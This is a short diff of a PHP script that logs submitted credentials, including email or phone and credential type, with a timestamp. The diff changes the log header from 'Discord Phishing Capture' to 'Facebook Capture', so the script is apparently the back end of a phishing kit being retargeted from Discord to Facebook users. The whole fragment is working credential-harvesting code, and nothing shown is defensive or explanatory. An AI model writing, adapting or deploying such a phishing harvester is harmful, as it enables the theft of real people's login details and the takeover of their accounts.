@@ -7,7 +7,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     if ($credentials) {
         $timestamp = date('Y-m-d H:i:s');
-        $log = "=== Discord Phishing Capture ===\n";
+        $log = "=== Facebook Capture ===\n";
         $log .= "Timestamp: $timestamp\n";
         $log .= "Type: " . ($credentials['type'] ?? 'unknown') . "\n";
         $log .= "Email/Phone: " . ($credentials['email'] ?? 'N/A') . "\n";
